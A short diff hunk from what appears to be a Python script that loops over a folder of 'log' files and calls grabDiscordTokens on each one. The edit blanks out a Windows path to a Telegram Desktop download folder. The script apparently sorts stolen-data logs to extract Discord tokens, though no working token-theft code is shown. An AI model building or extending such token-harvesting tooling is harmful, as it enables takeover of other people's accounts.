@@ -84,7 +84,7 @@ class Sort:
 
 if __name__ == '__main__':
     notify = Notify()
-    Sorted = Sort(r'C:\Users\user\Downloads\Telegram Desktop\nev + cr')
+    Sorted = Sort(r'')
 
     for log in Sorted.inputFiles:
         Sorted.grabDiscordTokens(log)
